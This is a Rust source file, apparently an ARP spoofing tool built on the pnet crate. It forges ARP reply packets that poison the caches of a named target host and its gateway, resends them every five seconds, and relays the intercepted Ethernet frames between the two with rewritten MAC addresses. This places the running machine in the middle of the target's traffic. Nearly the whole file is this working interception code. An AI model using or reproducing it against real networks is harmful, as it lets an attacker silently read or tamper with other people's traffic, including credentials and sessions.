use pnet::datalink::Channel::Ethernet;
use pnet::datalink::{self, DataLinkReceiver, DataLinkSender, NetworkInterface};
use pnet::packet::arp::{ArpHardwareTypes, ArpOperation, ArpOperations, MutableArpPacket};
use pnet::packet::ethernet::MutableEthernetPacket;
use pnet::packet::ethernet::{EtherTypes, EthernetPacket};
use pnet::packet::ipv4::Ipv4Packet;
use pnet::packet::MutablePacket;
use pnet::packet::Packet;
use pnet::util::MacAddr;

use std::net::Ipv4Addr;
use std::str::FromStr;
use std::thread::sleep;
use std::time::Duration;

pub mod cli;
#[derive(Clone)]
pub struct AddressConfig {
    interface_name: String,
    target_mac: MacAddr,
    target_ip: Ipv4Addr,
    gateway_ip: Ipv4Addr,
    gateway_mac: MacAddr,
    //host_ip: Ipv4Addr,
    host_mac: MacAddr,
}

fn create_arp_packet(
    sender_hw_addr: MacAddr,
    sender_proto_addr: Ipv4Addr,
    target_hw_addr: MacAddr,
    target_proto_addr: Ipv4Addr,
    operation: ArpOperation,
) -> Vec<u8> {
    let mut ethernet_buffer = [0u8; 60];
    let mut mut_ether = MutableEthernetPacket::new(&mut ethernet_buffer).unwrap();

    mut_ether.set_ethertype(EtherTypes::Arp);
    mut_ether.set_source(sender_hw_addr);
    mut_ether.set_destination(target_hw_addr);

    let mut arp_buffer = [0u8; 28];
    let mut mut_arp = MutableArpPacket::new(&mut arp_buffer).unwrap();

    mut_arp.set_hardware_type(ArpHardwareTypes::Ethernet);
    mut_arp.set_protocol_type(EtherTypes::Ipv4);
    mut_arp.set_hw_addr_len(6);
    mut_arp.set_proto_addr_len(4);
    mut_arp.set_operation(operation);
    mut_arp.set_sender_hw_addr(sender_hw_addr);
    mut_arp.set_sender_proto_addr(sender_proto_addr);
    mut_arp.set_target_hw_addr(target_hw_addr);
    mut_arp.set_target_proto_addr(target_proto_addr);

    mut_ether.set_payload(mut_arp.packet());

    return mut_ether.packet().to_vec();
}

fn get_interface(interface_name: &str) -> NetworkInterface {
    let interface_names_match = |iface: &NetworkInterface| iface.name == interface_name;

    // Find the network interface with the provided name
    let interfaces = datalink::interfaces();
    let interface = interfaces
        .into_iter()
        .filter(interface_names_match)
        .next()
        .unwrap();

    return interface;
}

fn get_host_mac(interface_name: &str) -> MacAddr {
    let interface = get_interface(interface_name);
    let host_mac: MacAddr = interface.mac.unwrap();
    return host_mac;
}

fn create_channel(interface_name: &str) -> (Box<dyn DataLinkSender>, Box<dyn DataLinkReceiver>) {
    let interface = get_interface(interface_name);
    // Create a new channel, dealing with layer 2 packets
    let (tx, rx) = match datalink::channel(&interface, Default::default()) {
        Ok(Ethernet(tx, rx)) => (tx, rx),
        Ok(_) => panic!("Unhandled channel type"),
        Err(e) => panic!(
            "An error occurred when creating the datalink channel: {}",
            e
        ),
    };

    (tx, rx)
}

impl AddressConfig {
    fn new(
        interface_name: &str,
        target_ip: &str,
        target_mac: &str,
        gateway_ip: &str,
        gateway_mac: &str,
    ) -> Self {
        AddressConfig {
            interface_name: interface_name.to_string(),
            target_mac: MacAddr::from_str(target_mac).unwrap(),
            target_ip: Ipv4Addr::from_str(target_ip).unwrap(),
            gateway_ip: Ipv4Addr::from_str(gateway_ip).unwrap(),
            gateway_mac: MacAddr::from_str(gateway_mac).unwrap(),
            //host_ip: Ipv4Addr::from_str(target_ip).unwrap(),
            host_mac: get_host_mac(interface_name),
        }
    }

    fn intercept_arp(&self) {
        loop {
            let (mut tx, _) = create_channel(&self.interface_name);
            let packet = create_arp_packet(
                self.host_mac,
                self.target_ip,
                self.gateway_mac,
                self.gateway_ip,
                ArpOperations::Reply,
            );
            tx.send_to(&packet, None);
            let packet = create_arp_packet(
                self.host_mac,
                self.gateway_ip,
                self.target_mac,
                self.target_ip,
                ArpOperations::Reply,
            );
            tx.send_to(&packet, None);

            sleep(Duration::new(5, 0));
        }
    }

    fn route_intercepted_packets(&self) {
        let (mut tx, mut rx) = create_channel(&self.interface_name);
        loop {
            match rx.next() {
                Ok(packet) => {
                    let ether_packet = EthernetPacket::new(packet).unwrap();
                    let ip_packet = Ipv4Packet::new(ether_packet.payload()).unwrap();
                    if ether_packet.get_source() == self.target_mac
                        && ether_packet.get_ethertype() != EtherTypes::Arp
                    {
                        tx.build_and_send(1, ether_packet.packet().len(), &mut |new_packet| {
                            let mut new_packet = MutableEthernetPacket::new(new_packet).unwrap();

                            // Create a clone of the original packet
                            new_packet.clone_from(&ether_packet);

                            // Switch the source and destination
                            new_packet.set_source(self.host_mac);
                            new_packet.set_destination(self.gateway_mac);
                        });
                    } else if ether_packet.get_source() == self.gateway_mac
                        && ip_packet.get_destination() == self.target_ip
                        && ether_packet.get_ethertype() != EtherTypes::Arp
                    {
                        tx.build_and_send(1, ether_packet.packet().len(), &mut |new_packet| {
                            let mut new_packet = MutableEthernetPacket::new(new_packet).unwrap();

                            // Create a clone of the original packet
                            new_packet.clone_from(&ether_packet);

                            // Switch the source and destination
                            new_packet.set_source(self.host_mac);
                            new_packet.set_destination(self.target_mac);
                        });
                    }
                }
                Err(e) => {
                    panic!("An error occurred while reading: {}", e);
                }
            }
        }
    }
}

//fn redirect_ether_packet(
//    ether_packet: EthernetPacket,
//    dest_mac: MacAddr,
//    src_mac: MacAddr,
//) -> Vec<u8> {
//    let mut ethernet_buffer = [0u8; 1518];
//    let mut new_packet = MutableEthernetPacket::new(&mut ethernet_buffer).unwrap();
//    new_packet.clone_from(&ether_packet);
//
//    new_packet.set_destination(dest_mac);
//    new_packet.set_source(src_mac);
//
//    return new_packet.packet().to_vec();
//}
